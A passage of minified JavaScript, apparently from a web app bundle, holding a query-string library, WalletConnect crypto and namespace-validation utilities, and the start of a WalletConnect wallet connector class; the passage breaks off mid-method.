a=o(),s=i(),c=e.origin,l=n();return{description:s,url:c,icons:l,name:a}}K1=sf.getWindowMetadata=V_;var Da={},Z_=t=>encodeURIComponent(t).replace(/[!'()*]/g,e=>`%${e.charCodeAt(0).toString(16).toUpperCase()}`),Y1="%[a-f0-9]{2}",q0=new RegExp("("+Y1+")|([^%]+?)","gi"),K0=new RegExp("("+Y1+")+","gi");function Bu(t,e){try{return[decodeURIComponent(t.join(""))]}catch{}if(t.length===1)return t;e=e||1;var n=t.slice(0,e),r=t.slice(e);return Array.prototype.concat.call([],Bu(n),Bu(r))}function G_(t){try{return decodeURIComponent(t)}catch{for(var e=t.match(q0)||[],n=1;n<e.length;n++)t=Bu(e,n).join(""),e=t.match(q0)||[];return t}}function q_(t){for(var e={"%FE%FF":"��","%FF%FE":"��"},n=K0.exec(t);n;){try{e[n[0]]=decodeURIComponent(n[0])}catch{var r=G_(n[0]);r!==n[0]&&(e[n[0]]=r)}n=K0.exec(t)}e["%C2"]="�";for(var o=Object.keys(e),i=0;i<o.length;i++){var a=o[i];t=t.replace(new RegExp(a,"g"),e[a])}return t}var K_=function(t){if(typeof t!="string")throw new TypeError("Expected `encodedURI` to be of type `string`, got `"+typeof t+"`");try{return t=t.replace(/\+/g," "),decodeURIComponent(t)}catch{return q_(t)}},Y_=(t,e)=>{if(!(typeof t=="string"&&typeof e=="string"))throw new TypeError("Expected the arguments to be of type `string`");if(e==="")return[t];const n=t.indexOf(e);return n===-1?[t]:[t.slice(0,n),t.slice(n+e.length)]},J_=function(t,e){for(var n={},r=Object.keys(t),o=Array.isArray(e),i=0;i<r.length;i++){var a=r[i],s=t[a];(o?e.indexOf(a)!==-1:e(a,s,t))&&(n[a]=s)}return n};(function(t){const e=Z_,n=K_,r=Y_,o=J_,i=b=>b==null,a=Symbol("encodeFragmentIdentifier");function s(b){switch(b.arrayFormat){case"index":return _=>(x,C)=>{const A=x.length;return C===void 0||b.skipNull&&C===null||b.skipEmptyString&&C===""?x:C===null?[...x,[u(_,b),"[",A,"]"].join("")]:[...x,[u(_,b),"[",u(A,b),"]=",u(C,b)].join("")]};case"bracket":return _=>(x,C)=>C===void 0||b.skipNull&&C===null||b.skipEmptyString&&C===""?x:C===null?[...x,[u(_,b),"[]"].join("")]:[...x,[u(_,b),"[]=",u(C,b)].join("")];case"colon-list-separator":return _=>(x,C)=>C===void 0||b.skipNull&&C===null||b.skipEmptyString&&C===""?x:C===null?[...x,[u(_,b),":list="].join("")]:[...x,[u(_,b),":list=",u(C,b)].join("")];case"comma":case"separator":case"bracket-separator":{const _=b.arrayFormat==="bracket-separator"?"[]=":"=";return x=>(C,A)=>A===void 0||b.skipNull&&A===null||b.skipEmptyString&&A===""?C:(A=A===null?"":A,C.length===0?[[u(x,b),_,u(A,b)].join("")]:[[C,u(A,b)].join(b.arrayFormatSeparator)])}default:return _=>(x,C)=>C===void 0||b.skipNull&&C===null||b.skipEmptyString&&C===""?x:C===null?[...x,u(_,b)]:[...x,[u(_,b),"=",u(C,b)].join("")]}}function c(b){let _;switch(b.arrayFormat){case"index":return(x,C,A)=>{if(_=/\[(\d*)\]$/.exec(x),x=x.replace(/\[\d*\]$/,""),!_){A[x]=C;return}A[x]===void 0&&(A[x]={}),A[x][_[1]]=C};case"bracket":return(x,C,A)=>{if(_=/(\[\])$/.exec(x),x=x.replace(/\[\]$/,""),!_){A[x]=C;return}if(A[x]===void 0){A[x]=[C];return}A[x]=[].concat(A[x],C)};case"colon-list-separator":return(x,C,A)=>{if(_=/(:list)$/.exec(x),x=x.replace(/:list$/,""),!_){A[x]=C;return}if(A[x]===void 0){A[x]=[C];return}A[x]=[].concat(A[x],C)};case"comma":case"separator":return(x,C,A)=>{const f=typeof C=="string"&&C.includes(b.arrayFormatSeparator),T=typeof C=="string"&&!f&&p(C,b).includes(b.arrayFormatSeparator);C=T?p(C,b):C;const R=f||T?C.split(b.arrayFormatSeparator).map(N=>p(N,b)):C===null?C:p(C,b);A[x]=R};case"bracket-separator":return(x,C,A)=>{const f=/(\[\])$/.test(x);if(x=x.replace(/\[\]$/,""),!f){A[x]=C&&p(C,b);return}const T=C===null?[]:C.split(b.arrayFormatSeparator).map(R=>p(R,b));if(A[x]===void 0){A[x]=T;return}A[x]=[].concat(A[x],T)};default:return(x,C,A)=>{if(A[x]===void 0){A[x]=C;return}A[x]=[].concat(A[x],C)}}}function l(b){if(typeof b!="string"||b.length!==1)throw new TypeError("arrayFormatSeparator must be single character string")}function u(b,_){return _.encode?_.strict?e(b):encodeURIComponent(b):b}function p(b,_){return _.decode?n(b):b}function m(b){return Array.isArray(b)?b.sort():typeof b=="object"?m(Object.keys(b)).sort((_,x)=>Number(_)-Number(x)).map(_=>b[_]):b}function g(b){const _=b.indexOf("#");return _!==-1&&(b=b.slice(0,_)),b}function w(b){let _="";const x=b.indexOf("#");return x!==-1&&(_=b.slice(x)),_}function v(b){b=g(b);const _=b.indexOf("?");return _===-1?"":b.slice(_+1)}function E(b,_){return _.parseNumbers&&!Number.isNaN(Number(b))&&typeof b=="string"&&b.trim()!==""?b=Number(b):_.parseBooleans&&b!==null&&(b.toLowerCase()==="true"||b.toLowerCase()==="false")&&(b=b.toLowerCase()==="true"),b}function I(b,_){_=Object.assign({decode:!0,sort:!0,arrayFormat:"none",arrayFormatSeparator:",",parseNumbers:!1,parseBooleans:!1},_),l(_.arrayFormatSeparator);const x=c(_),C=Object.create(null);if(typeof b!="string"||(b=b.trim().replace(/^[?#&]/,""),!b))return C;for(const A of b.split("&")){if(A==="")continue;let[f,T]=r(_.decode?A.replace(/\+/g," "):A,"=");T=T===void 0?null:["comma","separator","bracket-separator"].includes(_.arrayFormat)?T:p(T,_),x(p(f,_),T,C)}for(const A of Object.keys(C)){const f=C[A];if(typeof f=="object"&&f!==null)for(const T of Object.keys(f))f[T]=E(f[T],_);else C[A]=E(f,_)}return _.sort===!1?C:(_.sort===!0?Object.keys(C).sort():Object.keys(C).sort(_.sort)).reduce((A,f)=>{const T=C[f];return T&&typeof T=="object"&&!Array.isArray(T)?A[f]=m(T):A[f]=T,A},Object.create(null))}t.extract=v,t.parse=I,t.stringify=(b,_)=>{if(!b)return"";_=Object.assign({encode:!0,strict:!0,arrayFormat:"none",arrayFormatSeparator:","},_),l(_.arrayFormatSeparator);const x=T=>_.skipNull&&i(b[T])||_.skipEmptyString&&b[T]==="",C=s(_),A={};for(const T of Object.keys(b))x(T)||(A[T]=b[T]);const f=Object.keys(A);return _.sort!==!1&&f.sort(_.sort),f.map(T=>{const R=b[T];return R===void 0?"":R===null?u(T,_):Array.isArray(R)?R.length===0&&_.arrayFormat==="bracket-separator"?u(T,_)+"[]":R.reduce(C(T),[]).join("&"):u(T,_)+"="+u(R,_)}).filter(T=>T.length>0).join("&")},t.parseUrl=(b,_)=>{_=Object.assign({decode:!0},_);const[x,C]=r(b,"#");return Object.assign({url:x.split("?")[0]||"",query:I(v(b),_)},_&&_.parseFragmentIdentifier&&C?{fragmentIdentifier:p(C,_)}:{})},t.stringifyUrl=(b,_)=>{_=Object.assign({encode:!0,strict:!0,[a]:!0},_);const x=g(b.url).split("?")[0]||"",C=t.extract(b.url),A=t.parse(C,{sort:!1}),f=Object.assign(A,b.query);let T=t.stringify(f,_);T&&(T=`?${T}`);let R=w(b.url);return b.fragmentIdentifier&&(R=`#${_[a]?u(b.fragmentIdentifier,_):b.fragmentIdentifier}`),`${x}${T}${R}`},t.pick=(b,_,x)=>{x=Object.assign({parseFragmentIdentifier:!0,[a]:!1},x);const{url:C,query:A,fragmentIdentifier:f}=t.parseUrl(b,x);return t.stringifyUrl({url:C,query:o(A,_),fragmentIdentifier:f},x)},t.exclude=(b,_,x)=>{const C=Array.isArray(_)?A=>!_.includes(A):(A,f)=>!_(A,f);return t.pick(b,C,x)}})(Da);const X_={waku:{publish:"waku_publish",batchPublish:"waku_batchPublish",subscribe:"waku_subscribe",batchSubscribe:"waku_batchSubscribe",subscription:"waku_subscription",unsubscribe:"waku_unsubscribe",batchUnsubscribe:"waku_batchUnsubscribe"},irn:{publish:"irn_publish",batchPublish:"irn_batchPublish",subscribe:"irn_subscribe",batchSubscribe:"irn_batchSubscribe",subscription:"irn_subscription",unsubscribe:"irn_unsubscribe",batchUnsubscribe:"irn_batchUnsubscribe"},iridium:{publish:"iridium_publish",batchPublish:"iridium_batchPublish",subscribe:"iridium_subscribe",batchSubscribe:"iridium_batchSubscribe",subscription:"iridium_subscription",unsubscribe:"iridium_unsubscribe",batchUnsubscribe:"iridium_batchUnsubscribe"}},Q_=":";function n9(t){const[e,n]=t.split(Q_);return{namespace:e,reference:n}}function r9(t,e=[]){const n=[];return Object.keys(t).forEach(r=>{if(e.length&&!e.includes(r))return;const o=t[r];n.push(...o.accounts)}),n}function J1(t,e){return t.includes(":")?[t]:e.chains||[]}const X1="base10",Pt="base16",Lu="base64pad",cf="utf8",Q1=0,es=1,eE=0,Y0=1,ju=12,lf=32;function i9(){const t=nf.generateKeyPair();return{privateKey:fn(t.secretKey,Pt),publicKey:fn(t.publicKey,Pt)}}function o9(){const t=el.randomBytes(lf);return fn(t,Pt)}function a9(t,e){const n=nf.sharedKey(tn(t,Pt),tn(e,Pt),!0),r=new F8(il.SHA256,n).expand(lf);return fn(r,Pt)}function s9(t){const e=il.hash(tn(t,Pt));return fn(e,Pt)}function c9(t){const e=il.hash(tn(t,cf));return fn(e,Pt)}function tE(t){return tn(`${t}`,X1)}function sl(t){return Number(fn(t,X1))}function l9(t){const e=tE(typeof t.type<"u"?t.type:Q1);if(sl(e)===es&&typeof t.senderPublicKey>"u")throw new Error("Missing sender public key for type 1 envelope");const n=typeof t.senderPublicKey<"u"?tn(t.senderPublicKey,Pt):void 0,r=typeof t.iv<"u"?tn(t.iv,Pt):el.randomBytes(ju),o=new ef.ChaCha20Poly1305(tn(t.symKey,Pt)).seal(r,tn(t.message,cf));return nE({type:e,sealed:o,iv:r,senderPublicKey:n})}function u9(t){const e=new ef.ChaCha20Poly1305(tn(t.symKey,Pt)),{sealed:n,iv:r}=em(t.encoded),o=e.open(r,n);if(o===null)throw new Error("Failed to decrypt");return fn(o,cf)}function nE(t){if(sl(t.type)===es){if(typeof t.senderPublicKey>"u")throw new Error("Missing sender public key for type 1 envelope");return fn(P0([t.type,t.senderPublicKey,t.iv,t.sealed]),Lu)}return fn(P0([t.type,t.iv,t.sealed]),Lu)}function em(t){const e=tn(t,Lu),n=e.slice(eE,Y0),r=Y0;if(sl(n)===es){const s=r+lf,c=s+ju,l=e.slice(r,s),u=e.slice(s,c),p=e.slice(c);return{type:n,sealed:p,iv:u,senderPublicKey:l}}const o=r+ju,i=e.slice(r,o),a=e.slice(o);return{type:n,sealed:a,iv:i}}function d9(t,e){const n=em(t);return rE({type:sl(n.type),senderPublicKey:typeof n.senderPublicKey<"u"?fn(n.senderPublicKey,Pt):void 0,receiverPublicKey:e==null?void 0:e.receiverPublicKey})}function rE(t){const e=(t==null?void 0:t.type)||Q1;if(e===es){if(typeof(t==null?void 0:t.senderPublicKey)>"u")throw new Error("missing sender public key");if(typeof(t==null?void 0:t.receiverPublicKey)>"u")throw new Error("missing receiver public key")}return{type:e,senderPublicKey:t==null?void 0:t.senderPublicKey,receiverPublicKey:t==null?void 0:t.receiverPublicKey}}function f9(t){return t.type===es&&typeof t.senderPublicKey=="string"&&typeof t.receiverPublicKey=="string"}var iE=Object.defineProperty,J0=Object.getOwnPropertySymbols,oE=Object.prototype.hasOwnProperty,aE=Object.prototype.propertyIsEnumerable,X0=(t,e,n)=>e in t?iE(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,Q0=(t,e)=>{for(var n in e||(e={}))oE.call(e,n)&&X0(t,n,e[n]);if(J0)for(var n of J0(e))aE.call(e,n)&&X0(t,n,e[n]);return t};const sE="ReactNative",Lt={reactNative:"react-native",node:"node",browser:"browser",unknown:"unknown"},cE="js";function tm(){return typeof process<"u"&&typeof process.versions<"u"&&typeof process.versions.node<"u"}function ts(){return!of()&&!!af()&&navigator.product===sE}function cl(){return!tm()&&!!af()&&!!of()}function ns(){return ts()?Lt.reactNative:tm()?Lt.node:cl()?Lt.browser:Lt.unknown}function h9(){var t;try{return ts()&&typeof global<"u"&&typeof(global==null?void 0:global.Application)<"u"?(t=global.Application)==null?void 0:t.applicationId:void 0}catch{return}}function lE(t,e){let n=Da.parse(t);return n=Q0(Q0({},n),e),t=Da.stringify(n),t}function p9(){return K1()||{name:"",description:"",url:"",icons:[""]}}function uE(){if(ns()===Lt.reactNative&&typeof global<"u"&&typeof(global==null?void 0:global.Platform)<"u"){const{OS:n,Version:r}=global.Platform;return[n,r].join("-")}const t=n_();if(t===null)return"unknown";const e=t.os?t.os.replace(" ","").toLowerCase():"unknown";return t.type==="browser"?[e,t.name,t.version].join("-"):[e,t.version].join("-")}function dE(){var t;const e=ns();return e===Lt.browser?[e,((t=q1())==null?void 0:t.host)||"unknown"].join(":"):e}function fE(t,e,n){const r=uE(),o=dE();return[[t,e].join("-"),[cE,n].join("-"),r,o].join("/")}function m9({protocol:t,version:e,relayUrl:n,sdkVersion:r,auth:o,projectId:i,useOnCloseEvent:a,bundleId:s}){const c=n.split("?"),l=fE(t,e,r),u={auth:o,ua:l,projectId:i,useOnCloseEvent:a||void 0,origin:s||void 0},p=lE(c[1]||"",u);return c[0]+"?"+p}function Lr(t,e){return t.filter(n=>e.includes(n)).length===t.length}function g9(t){return Object.fromEntries(t.entries())}function w9(t){return new Map(Object.entries(t))}function b9(t=Wr.FIVE_MINUTES,e){const n=Wr.toMiliseconds(t||Wr.FIVE_MINUTES);let r,o,i;return{resolve:a=>{i&&r&&(clearTimeout(i),r(a))},reject:a=>{i&&o&&(clearTimeout(i),o(a))},done:()=>new Promise((a,s)=>{i=setTimeout(()=>{s(new Error(e))},n),r=a,o=s})}}function y9(t,e,n){return new Promise(async(r,o)=>{const i=setTimeout(()=>o(new Error(n)),e);try{const a=await t;r(a)}catch(a){o(a)}clearTimeout(i)})}function nm(t,e){if(typeof e=="string"&&e.startsWith(`${t}:`))return e;if(t.toLowerCase()==="topic"){if(typeof e!="string")throw new Error('Value must be "string" for expirer target type: topic');return`topic:${e}`}else if(t.toLowerCase()==="id"){if(typeof e!="number")throw new Error('Value must be "number" for expirer target type: id');return`id:${e}`}throw new Error(`Unknown expirer target type: ${t}`)}function v9(t){return nm("topic",t)}function x9(t){return nm("id",t)}function _9(t){const[e,n]=t.split(":"),r={id:void 0,topic:void 0};if(e==="topic"&&typeof n=="string")r.topic=n;else if(e==="id"&&Number.isInteger(Number(n)))r.id=Number(n);else throw new Error(`Invalid target, expected id:number or topic:string, got ${e}:${n}`);return r}function E9(t,e){return Wr.fromMiliseconds((e||Date.now())+Wr.toMiliseconds(t))}function C9(t){return Date.now()>=Wr.toMiliseconds(t)}function S9(t,e){return`${t}${e?`:${e}`:""}`}function Fl(t=[],e=[]){return[...new Set([...t,...e])]}async function A9({id:t,topic:e,wcDeepLink:n}){try{if(!n)return;const r=typeof n=="string"?JSON.parse(n):n;let o=r==null?void 0:r.href;if(typeof o!="string")return;o.endsWith("/")&&(o=o.slice(0,-1));const i=`${o}/wc?requestId=${t}&sessionTopic=${e}`,a=ns();a===Lt.browser?i.startsWith("https://")?window.open(i,"_blank","noreferrer noopener"):window.open(i,"_self","noreferrer noopener"):a===Lt.reactNative&&typeof(global==null?void 0:global.Linking)<"u"&&await global.Linking.openURL(i)}catch(r){console.error(r)}}async function T9(t,e){try{return await t.getItem(e)||(cl()?localStorage.getItem(e):void 0)}catch(n){console.error(n)}}const hE="irn";function I9(t){return(t==null?void 0:t.relay)||{protocol:hE}}function $9(t){const e=X_[t];if(typeof e>"u")throw new Error(`Relay Protocol not supported: ${t}`);return e}var pE=Object.defineProperty,eh=Object.getOwnPropertySymbols,mE=Object.prototype.hasOwnProperty,gE=Object.prototype.propertyIsEnumerable,th=(t,e,n)=>e in t?pE(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,wE=(t,e)=>{for(var n in e||(e={}))mE.call(e,n)&&th(t,n,e[n]);if(eh)for(var n of eh(e))gE.call(e,n)&&th(t,n,e[n]);return t};function bE(t,e="-"){const n={},r="relay"+e;return Object.keys(t).forEach(o=>{if(o.startsWith(r)){const i=o.replace(r,""),a=t[o];n[i]=a}}),n}function O9(t){t=t.includes("wc://")?t.replace("wc://",""):t,t=t.includes("wc:")?t.replace("wc:",""):t;const e=t.indexOf(":"),n=t.indexOf("?")!==-1?t.indexOf("?"):void 0,r=t.substring(0,e),o=t.substring(e+1,n).split("@"),i=typeof n<"u"?t.substring(n):"",a=Da.parse(i);return{protocol:r,topic:yE(o[0]),version:parseInt(o[1],10),symKey:a.symKey,relay:bE(a)}}function yE(t){return t.startsWith("//")?t.substring(2):t}function vE(t,e="-"){const n="relay",r={};return Object.keys(t).forEach(o=>{const i=n+e+o;t[o]&&(r[i]=t[o])}),r}function P9(t){return`${t.protocol}:${t.topic}@${t.version}?`+Da.stringify(wE({symKey:t.symKey},vE(t.relay)))}var xE=Object.defineProperty,_E=Object.defineProperties,EE=Object.getOwnPropertyDescriptors,nh=Object.getOwnPropertySymbols,CE=Object.prototype.hasOwnProperty,SE=Object.prototype.propertyIsEnumerable,rh=(t,e,n)=>e in t?xE(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,AE=(t,e)=>{for(var n in e||(e={}))CE.call(e,n)&&rh(t,n,e[n]);if(nh)for(var n of nh(e))SE.call(e,n)&&rh(t,n,e[n]);return t},TE=(t,e)=>_E(t,EE(e));function po(t){const e=[];return t.forEach(n=>{const[r,o]=n.split(":");e.push(`${r}:${o}`)}),e}function IE(t){const e=[];return Object.values(t).forEach(n=>{e.push(...po(n.accounts))}),e}function $E(t,e){const n=[];return Object.values(t).forEach(r=>{po(r.accounts).includes(e)&&n.push(...r.methods)}),n}function OE(t,e){const n=[];return Object.values(t).forEach(r=>{po(r.accounts).includes(e)&&n.push(...r.events)}),n}function D9(t,e){const n=jE(t,e);if(n)throw new Error(n.message);const r={};for(const[o,i]of Object.entries(t))r[o]={methods:i.methods,events:i.events,chains:i.accounts.map(a=>`${a.split(":")[0]}:${a.split(":")[1]}`)};return r}function rm(t){return t.includes(":")}function PE(t){return rm(t)?t.split(":")[0]:t}function im(t){var e,n,r;const o={};if(!uf(t))return o;for(const[i,a]of Object.entries(t)){const s=rm(i)?[i]:a.chains,c=a.methods||[],l=a.events||[],u=PE(i);o[u]=TE(AE({},o[u]),{chains:Fl(s,(e=o[u])==null?void 0:e.chains),methods:Fl(c,(n=o[u])==null?void 0:n.methods),events:Fl(l,(r=o[u])==null?void 0:r.events)})}return o}const DE={INVALID_METHOD:{message:"Invalid method.",code:1001},INVALID_EVENT:{message:"Invalid event.",code:1002},INVALID_UPDATE_REQUEST:{message:"Invalid update request.",code:1003},INVALID_EXTEND_REQUEST:{message:"Invalid extend request.",code:1004},INVALID_SESSION_SETTLE_REQUEST:{message:"Invalid session settle request.",code:1005},UNAUTHORIZED_METHOD:{message:"Unauthorized method.",code:3001},UNAUTHORIZED_EVENT:{message:"Unauthorized event.",code:3002},UNAUTHORIZED_UPDATE_REQUEST:{message:"Unauthorized update request.",code:3003},UNAUTHORIZED_EXTEND_REQUEST:{message:"Unauthorized extend request.",code:3004},USER_REJECTED:{message:"User rejected.",code:5e3},USER_REJECTED_CHAINS:{message:"User rejected chains.",code:5001},USER_REJECTED_METHODS:{message:"User rejected methods.",code:5002},USER_REJECTED_EVENTS:{message:"User rejected events.",code:5003},UNSUPPORTED_CHAINS:{message:"Unsupported chains.",code:5100},UNSUPPORTED_METHODS:{message:"Unsupported methods.",code:5101},UNSUPPORTED_EVENTS:{message:"Unsupported events.",code:5102},UNSUPPORTED_ACCOUNTS:{message:"Unsupported accounts.",code:5103},UNSUPPORTED_NAMESPACE_KEY:{message:"Unsupported namespace key.",code:5104},USER_DISCONNECTED:{message:"User disconnected.",code:6e3},SESSION_SETTLEMENT_FAILED:{message:"Session settlement failed.",code:7e3},WC_METHOD_UNSUPPORTED:{message:"Unsupported wc_ method.",code:10001}},RE={NOT_INITIALIZED:{message:"Not initialized.",code:1},NO_MATCHING_KEY:{message:"No matching key.",code:2},RESTORE_WILL_OVERRIDE:{message:"Restore will override.",code:3},RESUBSCRIBED:{message:"Resubscribed.",code:4},MISSING_OR_INVALID:{message:"Missing or invalid.",code:5},EXPIRED:{message:"Expired.",code:6},UNKNOWN_TYPE:{message:"Unknown type.",code:7},MISMATCHED_TOPIC:{message:"Mismatched topic.",code:8},NON_CONFORMING_NAMESPACES:{message:"Non conforming namespaces.",code:9}};function rr(t,e){const{message:n,code:r}=RE[t];return{message:e?`${n} ${e}`:n,code:r}}function no(t,e){const{message:n,code:r}=DE[t];return{message:e?`${n} ${e}`:n,code:r}}function ll(t,e){return Array.isArray(t)?typeof e<"u"&&t.length?t.every(e):!0:!1}function uf(t){return Object.getPrototypeOf(t)===Object.prototype&&Object.keys(t).length}function zr(t){return typeof t>"u"}function Jt(t,e){return e&&zr(t)?!0:typeof t=="string"&&!!t.trim().length}function df(t,e){return e&&zr(t)?!0:typeof t=="number"&&!isNaN(t)}function R9(t,e){const{requiredNamespaces:n}=e,r=Object.keys(t.namespaces),o=Object.keys(n);let i=!0;return Lr(o,r)?(r.forEach(a=>{const{accounts:s,methods:c,events:l}=t.namespaces[a],u=po(s),p=n[a];(!Lr(J1(a,p),u)||!Lr(p.methods,c)||!Lr(p.events,l))&&(i=!1)}),i):!1}function sc(t){return Jt(t,!1)&&t.includes(":")?t.split(":").length===2:!1}function NE(t){if(Jt(t,!1)&&t.includes(":")){const e=t.split(":");if(e.length===3){const n=e[0]+":"+e[1];return!!e[2]&&sc(n)}}return!1}function N9(t){if(Jt(t,!1))try{return typeof new URL(t)<"u"}catch{return!1}return!1}function k9(t){var e;return(e=t==null?void 0:t.proposer)==null?void 0:e.publicKey}function M9(t){return t==null?void 0:t.topic}function U9(t,e){let n=null;return Jt(t==null?void 0:t.publicKey,!1)||(n=rr("MISSING_OR_INVALID",`${e} controller public key should be a string`)),n}function ih(t){let e=!0;return ll(t)?t.length&&(e=t.every(n=>Jt(n,!1))):e=!1,e}function kE(t,e,n){let r=null;return ll(e)&&e.length?e.forEach(o=>{r||sc(o)||(r=no("UNSUPPORTED_CHAINS",`${n}, chain ${o} should be a string and conform to "namespace:chainId" format`))}):sc(t)||(r=no("UNSUPPORTED_CHAINS",`${n}, chains must be defined as "namespace:chainId" e.g. "eip155:1": {...} in the namespace key OR as an array of CAIP-2 chainIds e.g. eip155: { chains: ["eip155:1", "eip155:5"] }`)),r}function ME(t,e,n){let r=null;return Object.entries(t).forEach(([o,i])=>{if(r)return;const a=kE(o,J1(o,i),`${e} ${n}`);a&&(r=a)}),r}function UE(t,e){let n=null;return ll(t)?t.forEach(r=>{n||NE(r)||(n=no("UNSUPPORTED_ACCOUNTS",`${e}, account ${r} should be a string and conform to "namespace:chainId:address" format`))}):n=no("UNSUPPORTED_ACCOUNTS",`${e}, accounts should be an array of strings conforming to "namespace:chainId:address" format`),n}function BE(t,e){let n=null;return Object.values(t).forEach(r=>{if(n)return;const o=UE(r==null?void 0:r.accounts,`${e} namespace`);o&&(n=o)}),n}function LE(t,e){let n=null;return ih(t==null?void 0:t.methods)?ih(t==null?void 0:t.events)||(n=no("UNSUPPORTED_EVENTS",`${e}, events should be an array of strings or empty array for no events`)):n=no("UNSUPPORTED_METHODS",`${e}, methods should be an array of strings or empty array for no methods`),n}function om(t,e){let n=null;return Object.values(t).forEach(r=>{if(n)return;const o=LE(r,`${e}, namespace`);o&&(n=o)}),n}function B9(t,e,n){let r=null;if(t&&uf(t)){const o=om(t,e);o&&(r=o);const i=ME(t,e,n);i&&(r=i)}else r=rr("MISSING_OR_INVALID",`${e}, ${n} should be an object with data`);return r}function jE(t,e){let n=null;if(t&&uf(t)){const r=om(t,e);r&&(n=r);const o=BE(t,e);o&&(n=o)}else n=rr("MISSING_OR_INVALID",`${e}, namespaces should be an object with data`);return n}function FE(t){return Jt(t.protocol,!0)}function L9(t,e){let n=!1;return e&&!t?n=!0:t&&ll(t)&&t.length&&t.forEach(r=>{n=FE(r)}),n}function j9(t){return typeof t=="number"}function F9(t){return typeof t<"u"&&typeof t!==null}function W9(t){return!(!t||typeof t!="object"||!t.code||!df(t.code,!1)||!t.message||!Jt(t.message,!1))}function z9(t){return!(zr(t)||!Jt(t.method,!1))}function H9(t){return!(zr(t)||zr(t.result)&&zr(t.error)||!df(t.id,!1)||!Jt(t.jsonrpc,!1))}function V9(t){return!(zr(t)||!Jt(t.name,!1))}function Z9(t,e){return!(!sc(e)||!IE(t).includes(e))}function G9(t,e,n){return Jt(n,!1)?$E(t,e).includes(n):!1}function q9(t,e,n){return Jt(n,!1)?OE(t,e).includes(n):!1}function K9(t,e,n){let r=null;const o=WE(t),i=zE(e),a=Object.keys(o),s=Object.keys(i),c=oh(Object.keys(t)),l=oh(Object.keys(e)),u=c.filter(p=>!l.includes(p));return u.length&&(r=rr("NON_CONFORMING_NAMESPACES",`${n} namespaces keys don't satisfy requiredNamespaces.
      Required: ${u.toString()}
      Received: ${Object.keys(e).toString()}`)),Lr(a,s)||(r=rr("NON_CONFORMING_NAMESPACES",`${n} namespaces chains don't satisfy required namespaces.
      Required: ${a.toString()}
      Approved: ${s.toString()}`)),Object.keys(e).forEach(p=>{if(!p.includes(":")||r)return;const m=po(e[p].accounts);m.includes(p)||(r=rr("NON_CONFORMING_NAMESPACES",`${n} namespaces accounts don't satisfy namespace accounts for ${p}
        Required: ${p}
        Approved: ${m.toString()}`))}),a.forEach(p=>{r||(Lr(o[p].methods,i[p].methods)?Lr(o[p].events,i[p].events)||(r=rr("NON_CONFORMING_NAMESPACES",`${n} namespaces events don't satisfy namespace events for ${p}`)):r=rr("NON_CONFORMING_NAMESPACES",`${n} namespaces methods don't satisfy namespace methods for ${p}`))}),r}function WE(t){const e={};return Object.keys(t).forEach(n=>{var r;n.includes(":")?e[n]=t[n]:(r=t[n].chains)==null||r.forEach(o=>{e[o]={methods:t[n].methods,events:t[n].events}})}),e}function oh(t){return[...new Set(t.map(e=>e.includes(":")?e.split(":")[0]:e))]}function zE(t){const e={};return Object.keys(t).forEach(n=>{if(n.includes(":"))e[n]=t[n];else{const r=po(t[n].accounts);r==null||r.forEach(o=>{e[o]={accounts:t[n].accounts.filter(i=>i.includes(`${o}:`)),methods:t[n].methods,events:t[n].events}})}}),e}function Y9(t,e){return df(t,!1)&&t<=e.max&&t>=e.min}function J9(){const t=ns();return new Promise(e=>{switch(t){case Lt.browser:e(HE());break;case Lt.reactNative:e(VE());break;case Lt.node:e(ZE());break;default:e(!0)}})}function HE(){return cl()&&(navigator==null?void 0:navigator.onLine)}async function VE(){if(ts()&&typeof global<"u"&&global!=null&&global.NetInfo){const t=await(global==null?void 0:global.NetInfo.fetch());return t==null?void 0:t.isConnected}return!0}function ZE(){return!0}function X9(t){switch(ns()){case Lt.browser:GE(t);break;case Lt.reactNative:qE(t);break}}function GE(t){!ts()&&cl()&&(window.addEventListener("online",()=>t(!0)),window.addEventListener("offline",()=>t(!1)))}function qE(t){ts()&&typeof global<"u"&&global!=null&&global.NetInfo&&(global==null||global.NetInfo.addEventListener(e=>t(e==null?void 0:e.isConnected)))}const Wl={};class Q9{static get(e){return Wl[e]}static set(e,n){Wl[e]=n}static delete(e){delete Wl[e]}}var am="eip155",KE="store",sm="requestedChains",Fu="wallet_addEthereumChain",Ke,Ro,vs,Wu,ff,cm,xs,zu,Hu,lm,cc,hf,Ai,Ao,lc,pf,uc,mf,dc,gf,YE=class extends Oc{constructor(t){super({...t,options:{isNewChainsStale:!0,...t.options}}),Tt(this,vs),Tt(this,ff),Tt(this,xs),Tt(this,Hu),Tt(this,cc),Tt(this,Ai),Tt(this,lc),Tt(this,uc),Tt(this,dc),this.id="walletConnect",this.name="WalletConnect",this.ready=!0,Tt(this,Ke,void 0),Tt(this,Ro,void 0),this.onAccountsChanged=e=>{e.length===0?this.emit("disconnect"):this.emit("change",{account:Vt(e[0])})},this.onChainChanged=e=>{const n=Number(e),r=this.isChainUnsupported(n);this.emit("change",{chain:{id:n,unsupported:r}})},this.onDisconnect=()=>{ht(this,Ai,Ao).call(this,[]),this.emit("disconnect")},this.onDisplayUri=e=>{this.emit("message",{type:"display_uri",data:e})},this.onConnect=()=>{this.emit("connect",{})},ht(this,vs,Wu).call(this)}async connect({chainId:t,pairingTopic:e}={}){var n,r,o,i,a;try{let s=t;if(!s){const w=(n=this.storage)==null?void 0:n.getItem(KE),v=(i=(o=(r=w==null?void 0:w.state)==null?void 0:r.data)==null?void 0:o.chain)==null?void 0:i.id;v&&!this.isChainUnsupported(v)?s=v:s=(a=this.chains[0])==null?void 0:a.id}if(!s)throw new Error("No chains found on connector.");const c=await this.getProvider();ht(this,Hu,lm).call(this);const l=ht(this,xs,zu).call(this);if(c.session&&l&&await c.disconnect(),!c.session||l){const w=this.chains.filter(v=>v.id!==s).map(v=>v.id);this.emit("message",{type:"connecting"}),await c.connect({pairingTopic:e,optionalChains:[s,...w]}),ht(this,Ai,Ao).call(this,this.chains.map(({id:v})=>v))}const u=await c.enable(),p=Vt(u[0]),m=await this.getChainId(),g=this.isChainUnsupported(m);return{account:p,chain:{id:m,unsupported:g}}}catch(s){throw/user rejected/i.test(s==null?void 0:s.message)?new $t(s):s}}async disconnect(){const t=await this.getProvider();try{await t.disconnect()}catch(e){if(!/No matching key/i.test(e.message))throw e}finally{ht(this,cc,hf).call(this),ht(this,Ai,Ao).call(this,[])}}async getAccount(){const{accounts:t}=await this.getProvider();return Vt(t[0])}async 